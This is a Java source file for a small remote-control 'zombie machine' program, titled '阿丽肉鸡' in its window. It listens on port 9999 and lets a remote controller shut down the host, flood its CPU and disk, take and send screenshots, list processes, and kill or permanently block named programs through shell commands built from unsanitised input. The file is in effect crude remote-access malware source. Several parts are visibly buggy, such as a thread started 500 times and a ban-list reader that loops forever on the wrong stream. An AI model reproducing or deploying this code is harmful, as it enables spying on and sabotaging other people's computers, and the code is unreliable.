package Window;

import java.awt.Dimension;
import java.awt.Font;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentEvent;
import java.awt.event.ComponentListener;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Date;
import java.util.Scanner;

import javax.imageio.ImageIO;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;

@SuppressWarnings("serial")
public class RemoteWindow extends JFrame{
	
	JPanel mainPanel ;
	JTextArea logText ;
	JButton startButton ;
	JTextField portField ;
	JButton stopButton ;
	JScrollPane scrollPane ;
	ServerSocket server ;
	Socket socket ;
	InputStream in ;
	OutputStream out ;
	boolean flagService = true ;
	boolean tiredCPUFlag = true ;
	boolean tiredHDDFlag = true ;
	Thread cpuThread ;
	Thread hddThread ;
	ArrayList<String> banList = new ArrayList<String>() ;

	public static final int PORT = 9999 ;
	public RemoteWindow() {
		
		//---------------------------------添加控件操作------------------------------------
		Font font = new Font( "微软雅黑" , 1 , 12 ) ;
		mainPanel = new JPanel() ;
		
		startButton = new JButton( "启动" ) ;
		startButton.setFont(font) ;
		startButton.addActionListener( new ActionListener() {	
			@Override
			public void actionPerformed(ActionEvent e) {
				startRemote() ;
			}
		}) ;
		
		stopButton = new JButton( "停止" ) ;
		stopButton.setFont(font);
		stopButton.addActionListener( new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				stopRemote() ;
			}
		}) ;
		
		logText = new JTextArea() ;
		logText.setFont(font);
		logText.setEditable( false ) ;
		
		portField = new JTextField( PORT+"" ) ;
		portField.setFont(font);
		portField.setHorizontalAlignment(JTextField.RIGHT) ;
		
		scrollPane = new JScrollPane( logText ) ;
		scrollPane.setHorizontalScrollBarPolicy( JScrollPane.HORIZONTAL_SCROLLBAR_NEVER ) ;
		scrollPane.transferFocusUpCycle() ;
		
		mainPanel.setLayout( null ) ;
		mainPanel.add( startButton ) ;
		mainPanel.add( portField ) ;
		mainPanel.add( stopButton ) ;
		mainPanel.add( scrollPane ) ;

		//---------------------------------窗口布局操作------------------------------------
		this.add( mainPanel ) ;
		this.addComponentListener( new ComponentListener() {
			
			@Override
			public void componentShown(ComponentEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void componentResized(ComponentEvent e) {
				// TODO Auto-generated method stub
				autoLayout() ;
			}
			
			@Override
			public void componentMoved(ComponentEvent e) {
				// TODO Auto-generated method stub
				
			}
			
			@Override
			public void componentHidden(ComponentEvent e) {
				// TODO Auto-generated method stub
				
			}
		}) ;

		this.setDefaultCloseOperation( JFrame.EXIT_ON_CLOSE ) ;
		this.setFont(font) ;
		this.setTitle( "阿丽肉鸡Beta  V2.0" ) ;
		this.setSize( 400 , 600 ) ;
		this.setLocationRelativeTo( null ) ;
		this.setVisible( true ) ;
	}
	
	//---------------------------------业务操作------------------------------------
	/**
	 * 自动完成窗体布局
	 */
	public void autoLayout() {
		
		scrollPane.setBounds( 5 , 5 , mainPanel.getWidth()-10 , mainPanel.getHeight()-55 ) ;
		startButton.setBounds( scrollPane.getX() , scrollPane.getHeight()+scrollPane.getY()+10 , 60 , 30) ;
		portField.setBounds( mainPanel.getWidth()/2-50 , startButton.getY() + 5 , 100 , 20) ;
		stopButton.setBounds( mainPanel.getWidth()-66 , startButton.getY() , 60 , 30 ) ;
		
		if( server == null || server.isClosed() ) {
			startButton.setEnabled( true ) ;
			stopButton.setEnabled( false ) ;
		}else {
			startButton.setEnabled( false ) ;
			stopButton.setEnabled( true ) ;
		}
	}
	
	/**
	 * 窗体显示信息
	 */
	public void showMessage( String message ) {
		JOptionPane.showMessageDialog( this , message ) ;
	}
	
	/**
	 * @Description: 日志事件记录
	 * @param @param info   
	 * @return void  
	 * @throws
	 * @author Gavin
	 * @date 2015年3月12日
	 */
	@SuppressWarnings("deprecation")
	public void setLog( String info ){
		String text = this.logText.getText() ;
		this.logText.setText( text + new Date().toLocaleString()+" ： " + info +"\r\n" ) ;
	}
	/**
	 * 启动远程计算机
	 */
	public void startRemote() {
		if ( server == null || server.isClosed() ) {
			try {
				int newPort = Integer.parseInt(portField.getText()) ;
				server = new ServerSocket( newPort ) ;
				//JAVA将listen和accept合并起来了，直接用accept代替

				setLog( "服务器启动成功！" ) ;
				initBanList() ;
				new Thread( new Runnable() {
					@Override
					public void run() {
						// TODO Auto-generated method stub
						acceptUserInfo() ;
					}
				}).start() ;
				new Thread( new Runnable() {
					
					@Override
					public void run() {
						banApp() ; 
						try {
							Thread.sleep(1000);
						} catch (InterruptedException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				}).start() ;
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				setLog( "启动服务器出错！\n  " + e.getMessage() ) ;
			}
			autoLayout() ;
		}
	}
	
	/**
	 * 停止远程计算机
	 */
	public void stopRemote () {
		if ( server != null && socket != null) {
			try {
				server.close() ;
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				setLog("肉鸡停止失败！\n" + e.getMessage()) ;
			}
			try {
				socket.close() ;
			} catch ( IOException ioe) {
				// TODO: handle exception
				ioe.printStackTrace() ;
				setLog("堡鸡断开失败！\n" + ioe.getMessage()) ;
			}
			server = null ;
			socket = null ;
			setLog("堡鸡停止工作！") ;
		}else {
			try {
				server.close() ;
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				setLog("肉鸡已经停止！\n" + e.getMessage()) ;
			}
			server = null ;
			setLog("肉鸡停止进食！") ;
		}
		autoLayout() ;
	}
	
	/**
	 * 接收并处理用户请求
	 */
	public void acceptUserInfo() {
		setLog( "等待堡鸡！" );
		try {
			socket = server.accept() ;
			flagService = true ;
			setLog( "恭迎圣上！" ) ;
			new Thread( new Runnable() {
				@Override
				public void run() {
					while ( flagService ){
						try {
							service() ;
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
							setLog( "网络连接错误！\n"+e.getMessage() ) ;
						}
					}
					setLog( "收获圣旨！" ) ;
				}
			}).start() ;
			
		} catch (Exception e) {
			// TODO: handle exception
			setLog( "网络异常！\n" + e.getMessage() ) ;
		}
	}
	
	/**
	 * 接收并执行执行
	 */
	@SuppressWarnings("deprecation")
	public void service() throws IOException{
		if( socket != null && !socket.isClosed() ) {
			in = socket.getInputStream() ;
			out = socket.getOutputStream() ;
			int command = in.read() ;
			setLog( "接收指令成功！读取指令……" ) ;
			//——————————————————————————————————没有主机连接——————————————————————————————————
			if ( command == 0 ){
				flagService = false ;
				setLog( "圣上已经移驾别宫，等候归来……" ) ;
				acceptUserInfo() ;
			}
			//——————————————————————————————————接收关机指令——————————————————————————————————
			else if ( command == 1 ) {
				setLog( "关机指令接收成功，等待关机！" ) ;
				Runtime runtime = Runtime.getRuntime() ;
				runtime.exec( "shutdown -s -t 30 ") ;
			}
			//——————————————————————————————————取消关机指令——————————————————————————————————
			else if ( command == 2 ) {
				setLog( "取消关机指令接收成功，取消关机！" ) ;
				Runtime runtime = Runtime.getRuntime() ;
				runtime.exec( "shutdown -a ") ;
			}
			//——————————————————————————————————累死主机指令——————————————————————————————————
			else if ( command == 3 ) {
				setLog( "累死我的指令接收成功，公瑾，请鞭挞我把！" ) ;
				tiredCPUFlag = true ;
				tiredHDDFlag = true ;
				cpuThread = new Thread( new Runnable() {
					@Override
					public void run() {
						// TODO Auto-generated method stub
						while ( tiredCPUFlag ) {
							Toolkit toolkit = Toolkit.getDefaultToolkit();
							toolkit.beep();
							System.out.println("\007");
						}
					}
				});
				hddThread = new Thread( new Runnable() {
					@Override
					public void run() {
						// TODO Auto-generated method stub
						byte data[] = new byte[1024*1024*10] ;
						File file = new File( "e:/bin/1" ) ;
						try{
							while ( tiredHDDFlag ){
								FileOutputStream fileOut = new FileOutputStream( file ) ;
								fileOut.write( data ) ;
								fileOut.flush() ;
								fileOut.close() ;
								file.createNewFile() ;
							}
						}catch (Exception e) {
							e.printStackTrace();
							setLog("删除文件失败，无法累死远程计算机！");
						}
					}
				}) ;
				//累死CPU
				for (int i = 0; i < 500 ; i++) {				
					cpuThread.start() ;
				}
				//累死硬盘
				hddThread.start() ;
			}
			//——————————————————————————————————放松主机指令——————————————————————————————————
			else if ( command == 4 ) {
				setLog( "放弃累死肉鸡！" ) ;
				tiredCPUFlag = false ;
				tiredHDDFlag = false ;
			}
			//——————————————————————————————————监控指令主机指令——————————————————————————————————
			else if ( command == 5 ) {
				//截屏
				Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize() ;
				BufferedImage image = null ;	
				if( command == 5 ){
					try{
						Robot robot = new Robot() ;
						Rectangle rectangle = new Rectangle( screenSize ) ;
						image = robot.createScreenCapture( rectangle ) ;
						ImageIO.write( image , "bmp" , out ) ;
						out.flush() ;
					}catch (Exception e) {
						// TODO: handle exception
						e.printStackTrace() ;
						setLog( "图片截图失败！" + e.getMessage());
					}			
				}else if ( command == 6 ) {
					setLog( "肉鸡脱离了那只眼！" ) ;
				}
			}
			//——————————————————————————————————读取程序列表指令——————————————————————————————————
			else if ( command == 6 ) {
				setLog( "准备获取应用列表！" ) ;
				Process process = Runtime.getRuntime().exec( "tasklist" ) ;
				in = process.getInputStream() ;
				//InputStreamReader是Reader的子类，作用是将字节流的InputStream转化为字符流
				InputStreamReader reader = new InputStreamReader( in ) ;
				BufferedReader bufferedReader = new BufferedReader( reader ) ;
				bufferedReader.readLine() ;
				bufferedReader.readLine() ;
				int length = bufferedReader.readLine().split( " " )[0].length() ;
				byte[] data ;
				while ( true ) {
					String line = bufferedReader.readLine() ;
					
					if( line == null ) {
						data = "\r\n".getBytes() ;
						out.write(data.length) ;
						out.write(data) ;
						out.flush() ;
						break ;
					}else {
						String name = line.substring( 0 , length - 1);
						name = name.split("\\." , 2)[0] ;
						System.out.println( name );
						data = name.getBytes() ;
						out.write(data.length) ;
						out.write(data) ;
					}
				}
			}
			//——————————————————————————————————杀死肉鸡进程指令——————————————————————————————————
			else if ( command == 7 ) {
				byte data[] = new byte[in.read()] ;
				in.read(data) ;
				String name = new String(data) ;

				setLog("准杀死 "+name+" 程序！") ;
				Runtime.getRuntime().exec("tskill "+name ) ;
			}
			//——————————————————————————————————禁止肉鸡开启指定程序指令——————————————————————————————————
			else if (command == 8 ) {
				byte data[] = new byte[ in.read() ] ;
				in.read(data) ;
				String name  = new String(data) ;
				Runtime.getRuntime().exec("tskill "+name ) ;
				setLog("准备禁止 "+name+" 程序继续打开！") ;
				FileOutputStream fileOut = new FileOutputStream( "e:/bin/list",true);
				fileOut.write( name.getBytes() ) ;
				fileOut.write( "\r\n".getBytes() ) ;
				fileOut.close() ;
				initBanList() ;
			}
		}
	}
	//——————————————————————————————————肉鸡被禁用的软件列表的初始化——————————————————————————————————
	public void initBanList() {
		try {
			File file = new File("e:/bin/list");
			if ( !file.exists() ) {
				file.createNewFile() ;
			}
			FileInputStream fileIn = new FileInputStream( "e:/bin/list") ;
			BufferedReader reader = new BufferedReader( new InputStreamReader(in) ) ;
			while (true){
				String line = reader.readLine() ;
				if( line != null && line.equals("") ) {
					banList.add( line ) ;
				}
				
			}
		} catch (Exception e) {
			// TODO: handle exception
		}
	}
	//——————————————————————————————————禁用肉鸡程序打开（不断杀死这些程序）——————————————————————————————————
	public void banApp() {
		for (int i = 0 ; i < banList.size() ; i++) {
			String name = banList.get( i ) ;
			try {
				Runtime.getRuntime().exec("tskill "+name ) ;
			} catch (Exception e) {
				// TODO: handle exception
				e.printStackTrace();
			}
		}
	}
	
}
